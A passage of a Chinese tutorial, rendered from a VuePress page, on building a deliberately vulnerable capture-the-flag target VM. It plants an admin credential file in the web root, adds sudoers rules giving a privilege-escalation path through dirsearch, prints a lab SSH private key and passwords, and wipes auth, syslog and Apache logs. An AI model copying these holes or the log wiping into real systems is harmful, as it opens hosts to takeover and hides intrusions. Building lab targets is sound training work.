line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 1. 创建配置文件")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("tee")]),s._v(" /etc/my.cnf "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<<")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'EOF'\n[mysqld]\nbasedir=/usr/local/mysql\ndatadir=/var/lib/mysql\nsocket=/run/mysqld/mysqld.sock\nbind-address = 127.0.0.1\nport=3306\nuser=mysql\nmax_connections=151\ncharacter-set-server=utf8mb4\ncollation-server=utf8mb4_unicode_ci\ndefault-storage-engine=INNODB\n\n[client]\nsocket=/run/mysqld/mysqld.sock\nEOF")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 2. 创建systemd服务文件")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("tee")]),s._v(" /etc/systemd/system/mysql.service "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<<")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'EOF'\n[Unit]\nDescription=MySQL Server\nAfter=network.target\n\n[Service]\nType=simple\nUser=mysql\nGroup=mysql\nRuntimeDirectory=mysqld\nRuntimeDirectoryMode=0755\nExecStart=/usr/local/mysql/bin/mysqld --defaults-file=/etc/my.cnf\nRestart=on-failure\nRestartSec=5\nTimeoutStartSec=300\n\n[Install]\nWantedBy=multi-user.target\nEOF")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br")])]),a("p",[s._v("启动MySQL")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("systemctl daemon-reload\nsystemctl "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("enable")]),s._v(" mysql\nsystemctl start mysql\nsystemctl status mysql\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("（正常在线环境下，使用受支持版本的 Debian，直接 apt install mariadb-server 即可，这里只是因为模板系统过旧。）")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/26.png",alt:""}})]),s._v(" "),a("p",[s._v("创建全局符号链接")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-s")]),s._v(" /usr/local/mysql/bin/mysql /usr/local/bin/mysql\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-s")]),s._v(" /usr/local/mysql/bin/mysqladmin /usr/local/bin/mysqladmin\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-s")]),s._v(" /usr/local/mysql/bin/mysqldump /usr/local/bin/mysqldump\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("验证是否可用")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("mysql "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-uroot")]),s._v(" -puXEugaqla2%d\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-mao/27.png",alt:""}})]),s._v(" "),a("p",[s._v("修改mysql root 密码")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("mysqladmin "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" root -p"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'uXEugaqla2%d'")]),s._v(" password "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'6td36JaXdvyq7PJ8nklIzvqi'")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"配置-cms"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#配置-cms"}},[s._v("#")]),s._v(" 配置 CMS")]),s._v(" "),a("p",[s._v("访问 http://靶机IP/install.php 进行 cms 安装配置")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/28.png",alt:""}})]),s._v(" "),a("p",[s._v("随便想一个admin用户密码，例如：MazeSec2025")]),s._v(" "),a("p",[s._v("随便想一个邮箱，admin@maze-sec.com")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/29.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/30.png",alt:""}})]),s._v(" "),a("p",[s._v("在 CMS 根目录放一个 admin 用户的 备份凭证文件，确保是一个常见扫描工具的文件名并且 www-data 可读")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("root@Search:~"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# echo 'admin:MazeSec2025' > /var/www/html/frontend/web/setup.txt")]),s._v("\nroot@Search:~"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# ls -alh /var/www/html/frontend/web/setup.txt ")]),s._v("\n-rw-r--r-- "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" root root "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("18")]),s._v(" Dec  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("12")]),s._v(":56 /var/www/html/frontend/web/setup.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("www-data 用户的入口算是完成了")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/55.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_5、pip-安装-dirsearch"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_5、pip-安装-dirsearch"}},[s._v("#")]),s._v(" 5、pip 安装 dirsearch")]),s._v(" "),a("p",[s._v("dirsearch Github 仓库"),a("a",{attrs:{href:"https://github.com/maurosoria/dirsearch",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://github.com/maurosoria/dirsearch"),a("OutboundLink")],1)]),s._v(" "),a("p",[s._v("重点关注 python 版本要求 3.9 以上，可选择 pip 安装，靶机 python 3.9.2，符合条件")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/31.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/32.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_6、sudo-权限-dirsearch-配置"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_6、sudo-权限-dirsearch-配置"}},[s._v("#")]),s._v(" 6、sudo 权限 dirsearch 配置")]),s._v(" "),a("p",[s._v("查看 dirsearch 绝对路径 /usr/local/bin/dirsearch")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("root@Search:/var/www/html"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# which dirsearch")]),s._v("\n/usr/local/bin/dirsearch\nroot@Search:/var/www/html"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# ls -alh /usr/local/bin/dirsearch ")]),s._v("\n-rwxr-xr-x "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" root root "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("218")]),s._v(" Dec  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10")]),s._v(":58 /usr/local/bin/dirsearch\nroot@Search:/var/www/html"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# ")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-mao/33.png",alt:""}})]),s._v(" "),a("p",[s._v("给 www-data 用户授予 sudo -u 7r1umphk dirsearch 权限")]),s._v(" "),a("blockquote",[a("p",[s._v("使用 visudo 编辑 Sudoers 文件，它会进行语法检查，防止因配置错误导致 sudo 权限失效")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" visudo\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("删除原有的 welcome sudo 配置")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/34.png",alt:""}})]),s._v(" "),a("p",[s._v("添加两条 sudo 配置")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("www-data "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("ALL")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("7r1umphk"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" NOPASSWD: /usr/local/bin/dirsearch\n7r1umphk "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("ALL")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("root"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" NOPASSWD: /usr/local/bin/dirsearch\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-mao/35.png",alt:""}})]),s._v(" "),a("p",[s._v("修改完成，按 "),a("code",[s._v("Ctrl+X")]),s._v("，然后按 "),a("code",[s._v("Y")]),s._v(" 保存退出")]),s._v(" "),a("h2",{attrs:{id:"_7、给-7r1umphk-用户准备-ssh-公钥私钥对"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_7、给-7r1umphk-用户准备-ssh-公钥私钥对"}},[s._v("#")]),s._v(" 7、给 7r1umphk 用户准备 SSH 公钥私钥对")]),s._v(" "),a("p",[s._v("生成 ed25519 密钥对")]),s._v(" "),a("blockquote",[a("p",[s._v("-t 指定密钥类型为 ed25519，-f 指定密钥文件保存路径，-N '' 表示不设置密码")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("su")]),s._v(" - 7r1umphk\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" /home/7r1umphk/.ssh\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("700")]),s._v(" /home/7r1umphk/.ssh\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" ~/.ssh\nssh-keygen "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-t")]),s._v(" ed25519 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" /home/7r1umphk/.ssh/id_ed25519 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-N")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("''")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-mao/36.png",alt:""}})]),s._v(" "),a("p",[s._v("配置公钥")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" /home/7r1umphk/.ssh/id_ed25519.pub "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" /home/7r1umphk/.ssh/authorized_keys\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("600")]),s._v(" /home/7r1umphk/.ssh/authorized_keys\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" /home/7r1umphk/.ssh/authorized_keys\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-mao/37.png",alt:""}})]),s._v(" "),a("p",[s._v("出题人可以留一份私钥备份，方便测试")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("7r1umphk@Search:~/.ssh$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" id_ed25519\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACB9rlG1TssRfMc1WmPsKjHLmwwVG0ukYvKa4mMkYsmWyAAAAJg+y+ADPsvg\nAwAAAAtzc2gtZWQyNTUxOQAAACB9rlG1TssRfMc1WmPsKjHLmwwVG0ukYvKa4mMkYsmWyA\nAAAECPxip0hGT4O48HAkEWglmNjSaDrr8tXi1W+inEP7eAS32uUbVOyxF8xzVaY+wqMcub\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("DBUbS6Ri8priYyRiyZbIAAAADzdyMXVtcGhrQFNlYXJjaAECAwQFBg")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v("\n-----END OPENSSH PRIVATE KEY-----\n7r1umphk@Search:~/.ssh$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" authorized_keys \nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH2uUbVOyxF8xzVaY+wqMcubDBUbS6Ri8priYyRiyZbI 7r1umphk@Search\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br")])]),a("p",[a("strong",[s._v("以上操作仅靶机实验环境演示，不适用于实际生产环境，建议保存私钥后删除服务端私钥文件。")])]),s._v(" "),a("h2",{attrs:{id:"_8、root-家目录准备"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_8、root-家目录准备"}},[s._v("#")]),s._v(" 8、root 家目录准备")]),s._v(" "),a("p",[s._v("删除 root 家目录默认 root.txt 文件")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" /root/root.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("在root家目录创建 .ssh 目录，给选手多一个提权选择，脏数据写入公钥")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" /root/.ssh\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("700")]),s._v(" /root/.ssh\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("h2",{attrs:{id:"_9、放置-flag"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_9、放置-flag"}},[s._v("#")]),s._v(" 9、放置 flag")]),s._v(" "),a("p",[s._v("使用随机uuid 生成 flag 内容，靶机没有 uuidgen，回到我的kali本地")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ uuidgen "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("tr")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-d")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'-'")]),s._v("\n681db772f6844d4c84da083c3d280954\n                                                                                                                                                       \n┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ uuidgen "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("tr")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-d")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'-'")]),s._v("\n499f7ecdb8434a7a962b9d5c6d88edce\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("在 用户家目录 下创建 user.txt，但我为了避免选手直接猜中 /root/root.txt 这种常规路径，这里把 root flag 文件随机命名为 /root/uuid.txt")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'flag{user-681db772f6844d4c84da083c3d280954}'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /home/7r1umphk/user.txt\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'flag{root-499f7ecdb8434a7a962b9d5c6d88edce}'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /root/499f7ecdb8434a7a962b9d5c6d88edce.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("权限控制，家目录仅允许用户自己操作")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("700")]),s._v(" /home/7r1umphk/\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chown")]),s._v(" 7r1umphk:7r1umphk /home/7r1umphk/user.txt\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("600")]),s._v(" /home/7r1umphk/user.txt\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("600")]),s._v(" /root/499f7ecdb8434a7a962b9d5c6d88edce.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("权限确认，确认目录、文件都是预期权限")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-alh")]),s._v(" /home/\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-alh")]),s._v(" /root/\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-lah")]),s._v(" /home/7r1umphk/.ssh\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-alh")]),s._v(" /home/7r1umphk/user.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-mao/38.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_10、擦除痕迹"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_10、擦除痕迹"}},[s._v("#")]),s._v(" 10、擦除痕迹")]),s._v(" "),a("p",{staticStyle:{color:"red"}},[s._v("不建议直接在构建好的靶机上进行测试操作，可以选择把构建好的靶机导出一份 ova，作为新的靶机导入 VBox 进行测试。")]),s._v(" "),a("p",[s._v("这里只是为了让导出的 OVA 看起来更“干净”，避免泄露出题时的个人操作记录，并不能真正抹除所有痕迹。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-mao/39.png",alt:""}})]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" /root/.viminfo\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" /root/.python_history\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("rm")]),s._v(" /root/.mysql_history\n\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-s")]),s._v(" /dev/null /root/.viminfo\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-s")]),s._v(" /dev/null /root/.python_history\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-s")]),s._v(" /dev/null /root/.mysql_history\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 清常见文本日志")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /var/log/apache2/access.log\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /var/log/apache2/error.log\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /var/log/auth.log\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /var/log/syslog\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /var/log/apt/history.log\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" /var/log/apt/term.log\n")])]),s._v(" 